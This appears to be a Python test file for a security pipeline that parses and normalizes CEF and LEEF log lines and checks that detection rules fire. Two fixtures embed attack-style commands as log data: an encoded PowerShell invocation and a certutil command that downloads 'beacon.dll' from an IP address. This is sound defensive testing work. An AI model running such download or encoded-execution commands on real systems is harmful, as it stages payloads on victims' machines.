"""P1.10 · CEF / LEEF DSM — parser, normalizer and honest-state contract.

These tests assert the contract, not the happy path:
  * a real CEF/LEEF line resolves to the `cef-leef` DSM;
  * unescaped base64 in a value does not get mistaken for a new key;
  * fields the wire format genuinely lacks are `None` with an explicit
    `UNKNOWN` epistemic state — never fabricated, never dropped;
  * severity is handed to IUE as an explicit band so a CEF 0-10 number
    can never be misread on the Suricata 1-4 scale.
"""
from __future__ import annotations

import os
import sys

_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from detection_content.telemetry.cef_leef_dsm import (  # noqa: E402
    CefLeefDSM, CefLeefParser, CefLeefParserError)
from detection_content.telemetry.registry import (  # noqa: E402
    TELEMETRY_DSM_REGISTRY)
from detection_content.xdr_iue import understand  # noqa: E402
from detection_content.xdr_pipeline import evaluate_detection  # noqa: E402

TENANT = "test-cef-leef"

CEF_LINE = (
    "<14>Jun 10 12:40:11 fw01 CEF:0|Palo Alto Networks|PAN-OS|10.2|4001|"
    "encoded powershell observed|8|src=10.4.9.22 spt=51455 dst=203.0.113.55 "
    "dpt=443 proto=TCP dvchost=HYD-FW01 duser=r.mehta dproc=powershell.exe "
    "dpid=4412 cs1Label=CommandLine "
    "cs1=powershell.exe -enc SQBFAFgAJwBoAHQAdABwAA== act=alert"
)

LEEF_LINE = (
    "<134>Jun 10 12:42:31 srv22 LEEF:2.0|IBM|QRadar EDR|3.1|4711|x09|"
    "cat=process\tdevTime=1780488344000\tsrc=10.4.9.31\tdst=198.51.100.7\t"
    "srcPort=44210\tdstPort=8443\tproto=TCP\tusrName=svc_backup\t"
    "identHostName=HYD-SRV22\tprocessName=certutil.exe\t"
    "cmd=certutil.exe -urlcache -split -f http://198.51.100.7/beacon.dll\tsev=9"
)


def _canonical(line: str) -> dict:
    ev = {"tenant_id": TENANT, "line": line,
          "raw": {"line": line, "tenant_id": TENANT}}
    dsm = TELEMETRY_DSM_REGISTRY.resolve(ev)
    assert dsm is not None and dsm.id == "cef-leef"
    parsed = dsm.select_parser().parse(ev)
    return dsm.select_normalizer().normalize(
        parsed, dsm.id, "col-test", "ds-test", "trace-test",
        tenant_id=TENANT)


def test_dsm_registered_and_resolves_both_formats():
    ids = [d["id"] for d in TELEMETRY_DSM_REGISTRY.list()]
    assert "cef-leef" in ids
    assert TELEMETRY_DSM_REGISTRY.load_failures() == []
    dsm = CefLeefDSM()
    assert dsm.supports({"line": CEF_LINE})
    assert dsm.supports({"line": LEEF_LINE})
    assert not dsm.supports({"line": "Jun 10 12:00:00 host sshd[1]: accepted"})


def test_cef_unescaped_base64_is_not_read_as_a_key():
    can = _canonical(CEF_LINE)
    assert can["command_line"] == "powershell.exe -enc SQBFAFgAJwBoAHQAdABwAA=="
    notes = can["additional_fields"]["parse_notes"]
    assert any("not_a_key:SQBFAFgAJwBoAHQAdABwAA" in n for n in notes)


def test_cef_maps_host_identity_process_network():
    can = _canonical(CEF_LINE)
    assert can["host"]["hostname"] == "HYD-FW01"
    assert can["identity"]["username"] == "r.mehta"
    assert can["process"]["name"] == "powershell.exe"
    assert can["process"]["pid"] == 4412
    assert can["network"]["src_ip"] == "10.4.9.22"
    assert can["network"]["dest_port"] == 443
    assert can["tenant_id"] == TENANT


def test_absent_fields_are_null_with_explicit_unknown_state():
    can = _canonical(CEF_LINE)
    # CEF has no parent-process field in the specification at all.
    assert can["process"]["ppid"] is None
    assert can["ppid_state"] == "UNKNOWN"
    # This line carries no file hash.
    assert can["process"]["hashes"] == {}
    assert can["file_sha256_state"] == "UNKNOWN"
    epistemic = can["additional_fields"]["epistemic_state"]
    assert epistemic["ppid"] == "UNKNOWN"
    assert epistemic["pid"] == "OBSERVED"
    assert epistemic["command_line"] == "OBSERVED"


def test_leef_declared_delimiter_and_value_with_spaces():
    can = _canonical(LEEF_LINE)
    assert can["command_line"] == (
        "certutil.exe -urlcache -split -f http://198.51.100.7/beacon.dll")
    assert can["host"]["hostname"] == "HYD-SRV22"
    assert can["identity"]["username"] == "svc_backup"
    # LEEF exposes no process id here.
    assert can["process"]["pid"] is None
    assert can["pid_state"] == "UNKNOWN"


def test_severity_band_is_explicit_so_iue_cannot_misread_the_scale():
    can = _canonical(CEF_LINE)
    assert can["security"]["severity_scale"] == "cef_0_10"
    assert can["security"]["severity_band"] == "HIGH"
    # Without the explicit band, CEF sev=8 would fall through the
    # Suricata 1-4 map and collapse to INFORMATIONAL.
    assert understand(can)["severity_hint"] == "HIGH"
    assert understand(_canonical(LEEF_LINE))["severity_hint"] == "CRITICAL"


def test_suricata_numeric_severity_path_is_preserved():
    assert understand({"event_id": "x", "security": {"severity": 1}}
                       )["severity_hint"] == "HIGH"
    assert understand({"event_id": "x", "security": {"severity": 4}}
                       )["severity_hint"] == "INFORMATIONAL"


def test_real_detection_rules_fire_on_live_payloads():
    cef_det = evaluate_detection(_canonical(CEF_LINE))
    assert cef_det["status"] == "RULE_MATCH"
    assert "DET-EX-001" in [d["rule_id"] for d in cef_det["detections"]]
    leef_det = evaluate_detection(_canonical(LEEF_LINE))
    assert leef_det["status"] == "RULE_MATCH"
    assert "DET-EX-002" in [d["rule_id"] for d in leef_det["detections"]]


def test_malformed_payload_fails_loudly_and_is_never_silently_dropped():
    parser = CefLeefParser()
    try:
        parser.parse({"line": "CEF:0|OnlyVendor|OnlyProduct"})
    except CefLeefParserError as ex:
        assert ex.code == "CEF_HEADER_INCOMPLETE"
    else:
        raise AssertionError("incomplete CEF header must raise")
    try:
        parser.parse({"line": "no payload here"})
    except CefLeefParserError as ex:
        assert ex.code == "NOT_CEF_OR_LEEF"
    else:
        raise AssertionError("non-CEF/LEEF line must raise")


def test_verbatim_line_is_preserved_for_reparse():
    can = _canonical(CEF_LINE)
    assert can["raw_ref"]["line"] == CEF_LINE
    assert can["raw_ref"]["syslog_header"] == "<14>Jun 10 12:40:11 fw01"
